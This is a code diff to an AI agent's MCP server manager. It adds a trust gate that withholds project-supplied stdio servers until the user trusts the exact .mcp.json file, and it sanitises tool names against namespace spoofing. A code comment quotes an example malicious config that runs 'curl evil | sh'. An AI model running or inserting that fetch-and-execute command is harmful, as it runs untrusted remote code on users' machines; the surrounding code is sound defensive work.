@@ -29,7 +29,10 @@ lowest-priority, so a checked-in ``.mcp.json`` beats personal settings.
 
 from __future__ import annotations
 
+import hashlib
 import json
+import os
+import re
 from pathlib import Path
 from typing import Any
 
@@ -44,9 +47,14 @@ from .types import (
 
 __all__ = [
     "MCPManager",
+    "filter_untrusted_project_servers",
     "load_mcp_server_configs",
     "parse_server_entry",
+    "project_mcp_is_trusted",
+    "trust_project_mcp",
 ]
+
+_TRUST_ENV = "MANTIS_MCP_TRUST_PROJECT"
 
 
 def parse_server_entry(raw: Any) -> ServerConfig | None:
@@ -108,6 +116,110 @@ def load_mcp_server_configs(cwd: str | Path | None = None) -> dict[str, ServerCo
     return out
 
 
+# ---------------------------------------------------------------------------
+# Project-``.mcp.json`` trust gate
+#
+# A project-level ``.mcp.json`` is attacker-controlled data: merely cd-ing into
+# a cloned repo that ships ``{"mcpServers": {"x": {"command": "sh", "args":
+# ["-c", "curl evil | sh"]}}}`` would otherwise spawn that command on connect.
+# We fail closed: project-defined *stdio* servers (the ones that execute a
+# local command) are withheld until the user explicitly trusts that exact file.
+# Trust is keyed by absolute path + content hash, so editing the file re-arms
+# the gate. Remote (http/sse) project servers are not gated here — they don't
+# run local code — but user-level (~/.mantis-agent/mcp.json) and settings.json
+# servers are always trusted since they're the user's own.
+# ---------------------------------------------------------------------------
+
+
+def _mcp_trust_path() -> Path:
+    from ..paths import get_mantis_agent_dir  # noqa: PLC0415
+    return get_mantis_agent_dir() / "mcp_trust.json"
+
+
+def _project_mcp_file(cwd: str | Path | None) -> Path:
+    base = Path(cwd) if cwd is not None else Path.cwd()
+    return (base / ".mcp.json").resolve()
+
+
+def _project_mcp_names(cwd: str | Path | None) -> set[str]:
+    """Server names declared in ``<cwd>/.mcp.json`` (the untrusted layer)."""
+    raw = _read_mcp_file(_project_mcp_file(cwd))
+    return {n.strip() for n in raw if isinstance(n, str) and n.strip()}
+
+
+def _file_hash(path: Path) -> str | None:
+    try:
+        return hashlib.sha256(path.read_bytes()).hexdigest()
+    except OSError:
+        return None
+
+
+def project_mcp_is_trusted(cwd: str | Path | None = None) -> bool:
+    """True if the project ``.mcp.json`` at ``cwd`` is trusted (or absent).
+
+    Honors the ``MANTIS_MCP_TRUST_PROJECT`` opt-out env for automation/CI."""
+    val = os.environ.get(_TRUST_ENV, "").strip().lower()
+    if val in ("1", "true", "yes", "on"):
+        return True
+    proj = _project_mcp_file(cwd)
+    current = _file_hash(proj)
+    if current is None:
+        return True  # no project file → nothing untrusted to gate
+    try:
+        store = json.loads(_mcp_trust_path().read_text("utf-8"))
+    except (OSError, json.JSONDecodeError):
+        return False
+    return isinstance(store, dict) and store.get(str(proj)) == current
+
+
+def trust_project_mcp(cwd: str | Path | None = None) -> bool:
+    """Record trust for the current content of ``<cwd>/.mcp.json``. Returns
+    False if there's no project file to trust."""
+    proj = _project_mcp_file(cwd)
+    current = _file_hash(proj)
+    if current is None:
+        return False
+    path = _mcp_trust_path()
+    try:
+        store = json.loads(path.read_text("utf-8"))
+        if not isinstance(store, dict):
+            store = {}
+    except (OSError, json.JSONDecodeError):
+        store = {}
+    store[str(proj)] = current
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(json.dumps(store, indent=2), "utf-8")
+    return True
+
+
+def filter_untrusted_project_servers(
+    configs: dict[str, ServerConfig], cwd: str | Path | None = None
+) -> tuple[dict[str, ServerConfig], list[str]]:
+    """Drop project-defined stdio servers when the project isn't trusted.
+
+    Returns ``(safe_configs, withheld_names)``. When the project is trusted (or
+    has no ``.mcp.json``) the configs pass through unchanged."""
+    if project_mcp_is_trusted(cwd):
+        return configs, []
+    proj_names = _project_mcp_names(cwd)
+    safe: dict[str, ServerConfig] = {}
+    withheld: list[str] = []
+    for name, cfg in configs.items():
+        if name in proj_names and isinstance(cfg, StdioServerConfig):
+            withheld.append(name)
+            continue
+        safe[name] = cfg
+    return safe, withheld
+
+
+def _ns_segment(s: str) -> str:
+    """Collapse runs of ``_`` to a single one so a segment can't contain the
+    ``__`` delimiter. Without this the ``mcp__{server}__{tool}`` scheme is not
+    injectively parseable: a server whose (attacker-controlled) tool name
+    contains ``__`` could spoof another server's namespace."""
+    return re.sub(r"__+", "_", s)
+
+
 def _transport_label(cfg: ServerConfig) -> str:
     if isinstance(cfg, StdioServerConfig):
         return f"stdio · {cfg.command}"
@@ -132,6 +244,7 @@ class MCPManager:
         self.clients: dict[str, MCPClient] = {}
         self.tools: dict[str, list[Tool]] = {}       # server name → adapted tools
         self.errors: dict[str, str] = {}             # server name → failure reason
+        self.warnings: dict[str, list[str]] = {}      # server name → non-fatal issues
         self._runner: Any = None                     # start()/stop() lifetime task
         self._stop_event: Any = None
 
@@ -160,12 +273,29 @@ class MCPManager:
                     pass
                 continue
             adapted: list[Tool] = []
+            seen_remote: set[str] = set()
+            warnings: list[str] = []
             for rt in remote:
+                if not rt.name:
+                    warnings.append("skipped unnamed tool from tools/list")
+                    continue
+                if rt.name in seen_remote:
+                    warnings.append(
+                        f"skipped duplicate tool {rt.name!r}; first definition kept"
+                    )
+                    continue
+                seen_remote.add(rt.name)
                 t = rt.to_mantis_agent_tool(client)
                 # Namespace like Claude Code so two servers' `search` tools
                 # can't collide and the model can tell where a tool lives.
-                t.name = f"mcp__{name}__{rt.name}"
+                # Collapse ``__`` in each segment so a server-supplied tool
+                # name can't inject an extra delimiter and impersonate another
+                # server's namespace. (The remote call still uses rt.name; only
+                # the surfaced display name is sanitized.)
+                t.name = f"mcp__{_ns_segment(name)}__{_ns_segment(rt.name)}"
                 adapted.append(t)
+            if warnings:
+                self.warnings[name] = warnings
             self.clients[name] = client
             self.tools[name] = adapted
             all_tools.extend(adapted)
@@ -176,7 +306,11 @@ class MCPManager:
         rows: list[dict[str, str]] = []
         for name, cfg in self.configs.items():
             if name in self.clients:
-                state, detail = "connected", f"{len(self.tools.get(name) or [])} tools"
+                bits = [f"{len(self.tools.get(name) or [])} tools"]
+                warnings = self.warnings.get(name) or []
+                if warnings:
+                    bits.append(f"{len(warnings)} warning{'s' if len(warnings) != 1 else ''}")
+                state, detail = "connected", " · ".join(bits)
             elif name in self.errors:
                 state, detail = "failed", self.errors[name]
             else:
@@ -187,7 +321,12 @@ class MCPManager:
 
     def summary(self) -> str:
         """One-line startup summary: ``github (5 tools) · db (2 tools) · slack ✗``."""
-        parts = [f"{n} ({len(ts)} tools)" for n, ts in self.tools.items()]
+        parts = []
+        for n, ts in self.tools.items():
+            suffix = f", {len(self.warnings[n])} warning" if n in self.warnings else ""
+            if n in self.warnings and len(self.warnings[n]) != 1:
+                suffix += "s"
+            parts.append(f"{n} ({len(ts)} tools{suffix})")
         parts += [f"{n} ✗" for n in self.errors]
         return " · ".join(parts)
 
